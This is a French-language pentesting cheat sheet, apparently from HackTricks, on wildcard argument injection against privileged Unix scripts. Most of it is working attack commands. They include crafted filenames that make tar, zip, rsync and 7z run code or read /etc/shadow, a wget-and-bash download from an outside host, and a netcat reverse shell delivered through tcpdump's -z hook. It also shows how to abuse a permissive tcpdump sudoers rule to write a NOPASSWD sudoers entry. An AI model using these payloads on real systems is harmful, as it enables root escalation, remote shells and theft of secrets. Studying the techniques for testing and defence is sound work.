# Trucs et astuces sur les wildcards

{{#include ../../banners/hacktricks-training.md}}

> Wildcard (aka *glob*) **argument injection** se produit lorsqu'un script privilégié exécute un binaire Unix tel que `tar`, `chown`, `rsync`, `zip`, `7z`, … avec un wildcard non cité comme `*`.
> Puisque le shell développe le wildcard **avant** d'exécuter le binaire, un attaquant capable de créer des fichiers dans le répertoire de travail peut créer des noms de fichiers commençant par `-` afin qu'ils soient interprétés comme des **options plutôt que des données**, permettant ainsi d'introduire furtivement des options arbitraires voire des commandes.
> Cette page rassemble les primitives les plus utiles, les recherches récentes et les méthodes de détection modernes pour 2023-2025.

## chown / chmod

Vous pouvez **copier le propriétaire/groupe ou les bits de permission d'un fichier arbitraire** en abusant du flag `--reference` :
```bash
# attacker-controlled directory
touch "--reference=/root/secret``file"   # ← filename becomes an argument
```
Quand root exécute ensuite quelque chose comme :
```bash
chown -R alice:alice *.php
chmod -R 644 *.php
```
`--reference=/root/secret``file` est injecté, provoquant que *tous* les fichiers correspondants héritent de la propriété/permissions de `/root/secret``file`.

*PoC & tool*: [`wildpwn`](https://github.com/localh0t/wildpwn) (attaque combinée).
Voir aussi l'article classique de DefenseCode pour plus de détails.

---

## tar

### GNU tar (Linux, *BSD, busybox-full)

Exécuter des commandes arbitraires en abusant de la fonctionnalité **checkpoint** :
```bash
# attacker-controlled directory
echo 'echo pwned > /tmp/pwn' > shell.sh
chmod +x shell.sh
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
Lorsque root exécute, par exemple, `tar -czf /root/backup.tgz *`, `shell.sh` est exécuté en tant que root.

### bsdtar / macOS 14+

Le `tar` par défaut sur les versions récentes de macOS (basé sur `libarchive`) n’implémente *pas* `--checkpoint`, mais vous pouvez toujours obtenir une exécution de code avec l'option **--use-compress-program** qui vous permet de spécifier un compresseur externe.
```bash
# macOS example
touch "--use-compress-program=/bin/sh"
```
Lorsque un script privilégié exécute `tar -cf backup.tar *`, `/bin/sh` sera démarré.

---

## rsync

`rsync` permet de remplacer le shell distant, voire le binaire distant, à l'aide d'options en ligne de commande commençant par `-e` ou `--rsync-path` :
```bash
# attacker-controlled directory
touch "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
```
Si root archive ensuite le répertoire avec `rsync -az * backup:/srv/`, le flag injecté lance votre shell sur la machine distante.

*PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn) (`rsync` mode).

---

## 7-Zip / 7z / 7za

Même lorsque le script privilégié *défensivement* préfixe le wildcard par `--` (pour arrêter l'analyse des options), le format 7-Zip supporte les **file list files** en préfixant le nom de fichier par `@`. Combiner cela avec un symlink permet d'*exfiltrate arbitrary files*:
```bash
# directory writable by low-priv user
cd /path/controlled
ln -s /etc/shadow   root.txt      # file we want to read
touch @root.txt                  # tells 7z to use root.txt as file list
```
Si root exécute quelque chose comme :
```bash
7za a /backup/`date +%F`.7z -t7z -snl -- *
```
7-Zip tentera de lire `root.txt` (→ `/etc/shadow`) comme une liste de fichiers et s'arrêtera, **en affichant le contenu sur stderr**.

---

## zip

Deux primitives très pratiques existent lorsqu'une application transmet des noms de fichiers contrôlés par l'utilisateur à `zip` (soit via un wildcard soit en énumérant des noms sans `--`).

- RCE via test hook: `-T` active « test archive » et `-TT <cmd>` remplace le testeur par un programme arbitraire (forme longue : `--unzip-command <cmd>`). Si vous pouvez injecter des noms de fichiers qui commencent par `-`, séparez les flags sur des noms de fichiers distincts pour que l'analyse des options courtes fonctionne :
```bash
# Attacker-controlled filenames (e.g., in an upload directory)
# 1) A file literally named: -T
# 2) A file named: -TT wget 10.10.14.17 -O s.sh; bash s.sh; echo x
# 3) Any benign file to include (e.g., data.pcap)
# When the privileged code runs: zip out.zip <files...>
# zip will execute: wget 10.10.14.17 -O s.sh; bash s.sh; echo x
```
Remarques
- Do NOT try a single filename like `'-T -TT <cmd>'` — les options courtes sont analysées caractère par caractère et cela échouera. Utilisez des arguments séparés comme montré.
- Si les slashs sont retirés des noms de fichier par l'application, récupérez depuis un hôte/IP nu (chemin par défaut `/index.html`) et enregistrez localement avec `-O`, puis exécutez.
- Vous pouvez déboguer l'analyse avec `-sc` (affiche argv traité) ou `-h2` (plus d'aide) pour comprendre comment vos arguments sont consommés.

Exemple (comportement local sur zip 3.0):
```bash
zip test.zip -T '-TT wget 10.10.14.17/shell.sh' test.pcap    # fails to parse
zip test.zip -T '-TT wget 10.10.14.17 -O s.sh; bash s.sh' test.pcap  # runs wget + bash
```
- Data exfil/leak: Si la couche web renvoie les stdout/stderr de `zip` (fréquent avec des wrappers naïfs), des flags injectés comme `--help` ou des échecs dus à de mauvaises options apparaîtront dans la réponse HTTP, confirmant une injection de ligne de commande et aidant à régler le payload.

---

## Binaries supplémentaires vulnérables à wildcard injection (liste rapide 2023-2025)

The following commands have been abused in modern CTFs and real environments.  The payload is always created as a *filename* inside a writable directory that will later be processed with a wildcard:

| Binaire | Flag à abuser | Effet |
| --- | --- | --- |
| `bsdtar` | `--newer-mtime=@<epoch>` → arbitrary `@file` | Lire le contenu du fichier |
| `flock` | `-c <cmd>` | Exécuter une commande |
| `git`   | `-c core.sshCommand=<cmd>` | Exécution de commande via git over SSH |
| `scp`   | `-S <cmd>` | Lancer un programme arbitraire à la place de ssh |

Ces primitives sont moins courantes que les classiques *tar/rsync/zip* mais valent la peine d'être vérifiées lors des investigations.

---

## tcpdump rotation hooks (-G/-W/-z): RCE via argv injection in wrappers

When a restricted shell or vendor wrapper builds a `tcpdump` command line by concatenating user-controlled fields (e.g., a "file name" parameter) without strict quoting/validation, you can smuggle extra `tcpdump` flags. The combo of `-G` (time-based rotation), `-W` (limit number of files), and `-z <cmd>` (post-rotate command) yields arbitrary command execution as the user running tcpdump (often root on appliances).

Préconditions :

- Vous pouvez influencer les `argv` passés à `tcpdump` (par ex. via un wrapper comme `/debug/tcpdump --filter=... --file-name=<HERE>`).
- Le wrapper ne sanitize pas les espaces ni les tokens préfixés par `-` dans le champ file name.

PoC classique (exécute un reverse shell script depuis un chemin inscriptible) :
```sh
# Reverse shell payload saved on the device (e.g., USB, tmpfs)
cat > /mnt/disk1_1/rce.sh <<'EOF'
#!/bin/sh
rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f|/bin/sh -i 2>&1|nc 192.0.2.10 4444 >/tmp/f
EOF
chmod +x /mnt/disk1_1/rce.sh

# Inject additional tcpdump flags via the unsafe "file name" field
/debug/tcpdump --filter="udp port 1234" \
--file-name="test -i any -W 1 -G 1 -z /mnt/disk1_1/rce.sh"

# On the attacker host
nc -6 -lvnp 4444 &
# Then send any packet that matches the BPF to force a rotation
printf x | nc -u -6 [victim_ipv6] 1234
```
Détails :

- `-G 1 -W 1` force une rotation immédiate après le premier paquet correspondant.
- `-z <cmd>` exécute la commande post-rotation une fois par rotation. De nombreuses versions exécutent `<cmd> <savefile>`. Si `<cmd>` est un script/interpréteur, assurez-vous que la gestion des arguments correspond à votre payload.

No-removable-media variants:

- Si vous disposez de toute autre primitive pour écrire des fichiers (par ex., un wrapper de commande séparé qui permet la redirection de sortie), déposez votre script dans un chemin connu et déclenchez `-z /bin/sh /path/script.sh` ou `-z /path/script.sh` selon la sémantique de la plateforme.
- Certains wrappers fournis par le fournisseur effectuent la rotation vers des emplacements contrôlables par l'attaquant. Si vous pouvez influencer le chemin de rotation (symlink/directory traversal), vous pouvez orienter `-z` pour exécuter du contenu que vous contrôlez entièrement sans média externe.

---

## sudoers: tcpdump with wildcards/additional args → écritures/lectures arbitraires et root

Very common sudoers anti-pattern:
```text
(ALL : ALL) NOPASSWD: /usr/bin/tcpdump -c10 -w/var/cache/captures/*/<GUID-PATTERN> -F/var/cache/captures/filter.<GUID-PATTERN>
```
Problèmes
- Le `*` glob et les motifs permissifs ne restreignent que le premier argument `-w`. `tcpdump` accepte plusieurs options `-w` ; la dernière l'emporte.
- La règle ne verrouille pas les autres options, donc `-Z`, `-r`, `-V`, etc. sont autorisées.

Primitives
- Remplacer le chemin de destination avec un second `-w` (le premier ne sert qu'à satisfaire sudoers):
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ \
-w /dev/shm/out.pcap \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Path traversal à l'intérieur du premier `-w` pour s'échapper de l'arbre contraint :
```bash
sudo tcpdump -c10 \
-w/var/cache/captures/a/../../../../dev/shm/out \
-F/var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Forcer la propriété de sortie avec `-Z root` (crée des fichiers appartenant à root partout) :
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-w /dev/shm/root-owned \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Écriture de contenu arbitraire en rejouant un PCAP conçu via `-r` (p. ex., pour injecter une ligne sudoers):

<details>
<summary>Créez un PCAP qui contient le payload ASCII exact et écrivez-le en tant que root</summary>
```bash
# On attacker box: craft a UDP packet stream that carries the target line
printf '\n\nfritz ALL=(ALL:ALL) NOPASSWD: ALL\n' > sudoers
sudo tcpdump -w sudoers.pcap -c10 -i lo -A udp port 9001 &
cat sudoers | nc -u 127.0.0.1 9001; kill %1

# On victim (sudoers rule allows tcpdump as above)
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-r sudoers.pcap -w /etc/sudoers.d/1111-aaaa \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
</details>

- Lecture arbitraire de fichiers/secret leak avec `-V <file>` (interprète une liste de savefiles). Les diagnostics d'erreur echo souvent des lignes, leaking content:
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -V /root/root.txt \
-w /tmp/dummy \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
---

## Références

- [GTFOBins - tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
- [GTFOBins - zip](https://gtfobins.github.io/gtfobins/zip/)
- [0xdf - HTB Dump: Zip arg injection to RCE + tcpdump sudo misconfig privesc](https://0xdf.gitlab.io/2025/11/04/htb-dump.html)
- [FiberGateway GR241AG - Full Exploit Chain](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)

{{#include ../../banners/hacktricks-training.md}}
